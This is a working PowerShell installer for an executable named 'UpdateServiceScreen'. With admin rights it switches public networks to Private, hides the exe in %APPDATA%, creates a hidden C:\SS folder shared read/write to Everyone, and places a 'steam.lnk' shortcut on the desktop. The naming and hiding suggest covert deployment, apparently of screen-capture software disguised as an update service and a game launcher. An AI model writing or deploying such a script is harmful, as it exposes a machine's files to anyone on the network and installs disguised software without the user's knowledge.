#Requires -RunAsAdministrator

<#
.SYNOPSIS
Installation script for UpdateServiceScreen.

.DESCRIPTION
1. Checks if the script is run as administrator.
2. Changes the network profile of active public networks to Private.
3. Creates the folder %APPDATA%\UpdateServiceScreen.
4. Copies UpdateServiceScreen.exe to the created folder.
5. Creates the hidden folder C:\SS.
6. Shares the C:\SS folder for Everyone with Read/Write permissions.
7. Copies steam.lnk to the current user's Desktop.

.NOTES
Requires UpdateServiceScreen.exe and steam.lnk files in the same folder as the script.
The steam.lnk will be copied to the Desktop of the user running the script (the Administrator).
#>

Set-StrictMode -Version Latest

# 1. Check for Administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "This script must be run as administrator."
    Start-Sleep -Seconds 5 # Give the user time to read
    Exit 1 # Exit with an error code
}
Write-Host "Administrator privileges confirmed." -ForegroundColor Green

# 2. Change network profile to Private (if it's Public)
Write-Host "Checking and changing network profiles..."
try {
    $profiles = Get-NetConnectionProfile -ErrorAction SilentlyContinue
    $changed = $false
    if ($profiles) {
        foreach ($profile in $profiles) {
            if ($profile.NetworkCategory -eq 'Public') {
                Write-Host "Found public profile: '$($profile.Name)' (Interface: $($profile.InterfaceAlias)). Attempting to change to 'Private'..."
                Set-NetConnectionProfile -InterfaceIndex $profile.InterfaceIndex -NetworkCategory Private -ErrorAction Stop
                Write-Host "Profile '$($profile.Name)' successfully changed to Private." -ForegroundColor Green
                $changed = $true
            }
        }
        if (-not $changed) {
            Write-Host "No active public network profiles found." -ForegroundColor Yellow
        }
    } else {
         Write-Host "Could not retrieve network profile information. Maybe there is no active connection." -ForegroundColor Yellow
    }
} catch {
    Write-Warning "Failed to change network profile. Error: $($_.Exception.Message)"
}

# 3. Create the %APPDATA%\UpdateServiceScreen folder
$appDataPath = Join-Path -Path $env:APPDATA -ChildPath "UpdateServiceScreen"
Write-Host "Creating folder: $appDataPath"
try {
    New-Item -ItemType Directory -Path $appDataPath -Force -ErrorAction Stop
    Write-Host "Folder '$appDataPath' created successfully." -ForegroundColor Green
} catch {
    Write-Warning "Failed to create folder '$appDataPath'. Error: $($_.Exception.Message)"
}

# 4. Copy the UpdateServiceScreen.exe file
$scriptDir = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
$sourceExe = Join-Path -Path $scriptDir -ChildPath "UpdateServiceScreen.exe"
$destinationExe = Join-Path -Path $appDataPath -ChildPath "UpdateServiceScreen.exe"

Write-Host "Copying file: $sourceExe -> $destinationExe"
if (Test-Path $sourceExe) {
    try {
        Copy-Item -Path $sourceExe -Destination $destinationExe -Force -ErrorAction Stop
        Write-Host "'UpdateServiceScreen.exe' copied successfully." -ForegroundColor Green
    } catch {
        Write-Warning "Failed to copy 'UpdateServiceScreen.exe'. Error: $($_.Exception.Message)"
    }
} else {
    Write-Warning "Source file '$sourceExe' not found. File not copied."
}

# 5. Create the hidden C:\SS folder
$ssFolderPath = "C:\SS"
Write-Host "Creating folder: $ssFolderPath"
try {
    New-Item -ItemType Directory -Path $ssFolderPath -Force -ErrorAction Stop
    # Make the folder hidden
    Write-Host "Making folder '$ssFolderPath' hidden..."
    (Get-Item $ssFolderPath).Attributes += 'Hidden'
    Write-Host "Folder '$ssFolderPath' created and hidden successfully." -ForegroundColor Green
} catch {
    Write-Warning "Failed to create or hide folder '$ssFolderPath'. Error: $($_.Exception.Message)"
}

# 6. Create a network share for C:\SS with Read/Write permissions for Everyone
$shareName = "SS"
Write-Host "Creating network share: $shareName ($ssFolderPath)"
try {
    # Check if a share with this name already exists
    if (Get-SmbShare -Name $shareName -ErrorAction SilentlyContinue) {
        Write-Host "Share '$shareName' already exists. Removing the old one before creating a new one."
        Remove-SmbShare -Name $shareName -Force -ErrorAction Stop
    }

    # Create the share
    New-SmbShare -Name $shareName -Path $ssFolderPath -Description "Shared folder for SS" -ErrorAction Stop

    # Set Read/Write (Change) permissions for Everyone.
    # Resolve the group by its well-known SID (S-1-1-0) so the account name is
    # correct on any UI language (e.g. "Все" on Russian Windows) — passing the
    # literal "Everyone" fails with error 1332 on non-English systems.
    $everyoneName = ([System.Security.Principal.SecurityIdentifier]'S-1-1-0').Translate([System.Security.Principal.NTAccount]).Value
    Write-Host "Setting access permissions for '$shareName' ($everyoneName: Change)..."
    Grant-SmbShareAccess -Name $shareName -AccountName $everyoneName -AccessRight Change -Force -ErrorAction Stop

    Write-Host "Network share '$shareName' created and configured successfully." -ForegroundColor Green
} catch {
    Write-Warning "Failed to create or configure network share '$shareName'. Error: $($_.Exception.Message)"
}

# 7. Copy steam.lnk to the Desktop
$sourceLnk = Join-Path -Path $scriptDir -ChildPath "steam.lnk"
try {
    # Get the path to the current user's Desktop folder
    $desktopPath = [Environment]::GetFolderPath('Desktop')
    $destinationLnk = Join-Path -Path $desktopPath -ChildPath "steam.lnk"

    Write-Host "Copying shortcut: $sourceLnk -> $destinationLnk"
    if (Test-Path $sourceLnk) {
        Copy-Item -Path $sourceLnk -Destination $destinationLnk -Force -ErrorAction Stop
        Write-Host "Shortcut 'steam.lnk' copied successfully to Desktop." -ForegroundColor Green
    } else {
        Write-Warning "Source shortcut file '$sourceLnk' not found. Shortcut not copied."
    }
} catch {
    Write-Warning "Failed to copy shortcut 'steam.lnk' to Desktop. Error: $($_.Exception.Message)"
}

Write-Host "Installation complete." -ForegroundColor Green